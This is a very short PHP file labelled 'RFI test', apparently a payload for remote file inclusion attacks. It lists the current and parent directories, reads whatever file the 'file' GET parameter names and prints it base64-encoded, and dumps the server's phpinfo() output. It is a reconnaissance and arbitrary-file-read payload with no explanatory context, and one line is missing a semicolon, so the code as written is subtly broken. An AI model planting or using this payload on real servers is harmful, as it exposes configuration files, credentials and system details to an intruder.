// RFI test
<?php
  print_r(scandir("."));

  print_r(scandir("../."))
    
  $data = file_get_contents($_GET["file"]);
  echo base64_encode($data);
    
  phpinfo();
?>
